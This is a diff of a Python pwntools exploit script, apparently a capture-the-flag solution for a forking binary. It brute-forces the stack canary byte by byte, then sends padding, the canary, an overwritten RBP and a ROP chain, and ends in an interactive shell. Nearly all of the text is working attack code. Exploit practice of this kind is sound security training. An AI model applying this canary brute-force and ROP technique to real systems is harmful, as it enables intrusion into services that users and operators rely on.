@@ -36,13 +36,13 @@ Values """
 
 
 # Initial payload setting
-safe_stack_buf = b'a' * 24
+safe_stack_buf = b'\x01' * 24
 
 canary = b""
 canary_len = 0
 byte_int_try = 0
 
-cover_rbp = b'a' * 8
+cover_rbp = b'\x01' * 8
 
 rop_chain = b""
 rop_chain += p64(0x000000000044c2a6) # -> pop rdx; ret;
@@ -75,7 +75,7 @@ while True:
     p.recvuntil(b"3. stop create child and get out")
     p.send(b'1\n')
 
-    p.recvuntil(b"father\n")
+    p.recvuntil(b"Say something to your father\n")
     p.send(safe_stack_buf + canary + byte_try)
     
     line = p.recvline().decode('utf-8').strip()
@@ -91,16 +91,15 @@ while True:
     if canary_len == 8:
         break
 
-print(canary.decode('latin-1').encode('unicode-escape').decode('ascii'))
+print("FOUND:\\x" + '\\x'.join("{:02x}".format(c) for c in canary))
+
 
 # Start to inject ROP
 p.recvuntil(b"3. stop create child and get out")
 p.send(b'3\n')
 
-# raw_input() # In python standard library, used for wating input
 payload = safe_stack_buf + canary + cover_rbp + rop_chain
 p.recvuntil(b"Please help me find my children !!!!!\n")
-# raw_input() # In python standard library, used for wating input
 p.send(payload)
 
 p.interactive()
